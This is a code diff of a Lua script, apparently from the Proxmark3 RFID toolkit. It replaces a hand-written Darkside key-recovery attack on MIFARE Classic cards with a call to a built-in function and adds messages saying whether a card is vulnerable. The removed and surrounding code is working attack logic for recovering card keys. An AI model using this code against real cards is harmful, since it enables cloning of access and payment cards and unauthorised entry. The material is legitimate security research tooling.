@@ -63,90 +63,6 @@ function wait_for_mifare()
 	return nil, "Aborted by user"
 end
 
-function mfcrack()
-	core.clearCommandBuffer()
-	-- Build the mifare-command
-	local cmd = Command:new{cmd = cmds.CMD_READER_MIFARE, arg1 = 1, arg2 = 0, arg3 = MIFARE_AUTH_KEYA}
-	
-	local retry = true
-	while retry do
-		core.SendCommand(cmd:getBytes())
-		local key, errormessage = mfcrack_inner()
-		-- Success?
-		if key then return key end
-		-- Failure? 
-		if errormessage then return nil, errormessage end
-		-- Try again..set arg1 to 0 this time. 
-
-		cmd = Command:new{cmd = cmds.CMD_READER_MIFARE, arg1 = 0, arg2 = 0, arg3 = MIFARE_AUTH_KEYA}
-	end	
-	return nil, "Aborted by user"
-end
-
-function mfcrack_inner()
-	while not core.ukbhit() do		
-		local result = core.WaitForResponseTimeout(cmds.CMD_ACK,1000)
-		if result then
-
-			--[[
-			I don't understand, they cmd and args are defined as uint32_t, however, 
-			looking at the returned data, they all look like 64-bit things: 
-
-			print("result", bin.unpack("HHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHHH", result))
-
-			FF	00	00	00	00	00	00	00	<-- 64 bits of data
-			FE	FF	FF	FF	00	00	00	00	<-- 64 bits of data
-			00	00	00	00	00	00	00	00	<-- 64 bits of data
-			00	00	00	00	00	00	00	00	<-- 64 bits of data
-			04	7F	12	E2	00             <-- this is where 'data' starts
-
-			So below I use LI to pick out the "FEFF FFFF", don't know why it works.. 
-			--]]
-			-- Unpacking the arg-parameters
-			local count,cmd,isOK = bin.unpack('LI',result)
-			--print("response", isOK)--FF FF FF FF
-			if isOK == 0xFFFFFFFF then
-				return nil, "Button pressed. Aborted."
-			elseif isOK == 0xFFFFFFFE then
-				return nil, "Card is not vulnerable to Darkside attack (doesn't send NACK on authentication requests). You can try 'script run mfkeys' or 'hf mf chk' to test various known keys."
-			elseif isOK == 0xFFFFFFFD then
-				return nil, "Card is not vulnerable to Darkside attack (its random number generator is not predictable). You can try 'script run mfkeys' or 'hf mf chk' to test various known keys."
-			elseif isOK == 0xFFFFFFFC then
-				return nil, "The card's random number generator behaves somewhat weird (Mifare clone?). You can try 'script run mfkeys' or 'hf mf chk' to test various known keys."
-			elseif isOK ~= 1 then 
-				return nil, "Error occurred" 
-			end
-
-
-			-- The data-part is left
-			-- Starts 32 bytes in, at byte 33
-			local data = result:sub(33)
-
-			-- A little helper
-			local get = function(num)
-				local x = data:sub(1,num)
-				data = data:sub(num+1)
-				return x
-			end
-
-			local uid,nt,pl = get(4),get(4),get(8)
-			local ks,nr = get(8),get(4)
-
-			local status, key = core.nonce2key(uid, nt, nr, pl, ks)
-			if not status then return status,key end
-
-			if status > 0 then 
-				print("Key not found (lfsr_common_prefix problem)")
-				-- try again
-				return nil,nil
-			else
-				return key
-			end
-		end
-	end
-	return nil, "Aborted by user"
-end
-
 function nested(key,sak)
 	local typ = 1
 	if 0x18 == sak then --NXP MIFARE Classic 4k | Plus 4k | Ev1 4k
@@ -211,8 +127,15 @@ function main(args)
 			print("Card found, commencing crack on UID", uid)
 			-- Crack it
 			local key, cnt
-			res,err = mfcrack()
-			if not res then return oops(err) end
+			err, res = core.mfDarkside()
+			if     err == -1 then return oops("Button pressed. Aborted.") 
+			elseif err == -2 then return oops("Card is not vulnerable to Darkside attack (doesn't send NACK on authentication requests).")
+			elseif err == -3 then return oops("Card is not vulnerable to Darkside attack (its random number generator is not predictable).")
+			elseif err == -4 then return oops([[
+Card is not vulnerable to Darkside attack (its random number generator seems to be based on the wellknown
+generating polynomial with 16 effective bits only, but shows unexpected behaviour.]])
+			elseif err == -5 then return oops("Aborted via keyboard.")
+			end
 			-- The key is actually 8 bytes, so a 
 			-- 6-byte key is sent as 00XXXXXX
 			-- This means we unpack it as first
